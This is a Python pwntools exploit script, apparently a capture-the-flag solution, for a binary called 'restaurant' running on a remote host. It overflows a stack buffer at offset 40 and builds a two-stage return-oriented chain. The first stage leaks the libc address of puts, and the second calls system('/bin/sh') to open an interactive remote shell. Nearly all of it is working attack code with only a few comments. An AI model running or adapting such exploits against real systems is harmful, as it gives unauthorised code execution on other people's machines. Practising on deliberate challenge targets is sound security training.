#!/usr/bin/env python3
from pwn import *

# Set context for automatic packing/unpacking
context.binary = elf = ELF("./restaurant", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

# Use 'debug' to see the exact flow if it hangs again
context.log_level = 'info' 

HOST, PORT = "154.57.164.81", 32402
io = remote(HOST, PORT)

# --- Stage 1: Leak Libc ---
log.info("Stage 1: Leaking libc...")

rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
main = elf.symbols['main']

# We use 'a' (lowercase) to match your debug log
offset = 40
payload = b"a" * offset
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(main)

io.sendlineafter(b"> ", b"1") # Go to ingredients
io.sendlineafter(b"> ", payload)

# 1. Consume the "Enjoy your..." echo
# It stops at the first null byte of the ROP chain (the pop_rdi gadget)
io.recvuntil(b"Enjoy your " + b"a" * offset)
io.recv(3) # Consume the 'a3 10 40' part of the gadget echoed before the null

# 2. The very next line is the actual leak from puts(puts_got)
leak_raw = io.recvline().strip()
leaked_puts = u64(leak_raw.ljust(8, b"\x00"))

libc.address = leaked_puts - libc.symbols.puts
log.success(f"Libc Base: {hex(libc.address)}")

# --- Stage 2: Shell ---
log.info("Stage 2: Spawning shell...")

ret = rop.find_gadget(["ret"]).address # For stack alignment

payload = b"a" * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.symbols.system)

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"> ", payload)

io.interactive()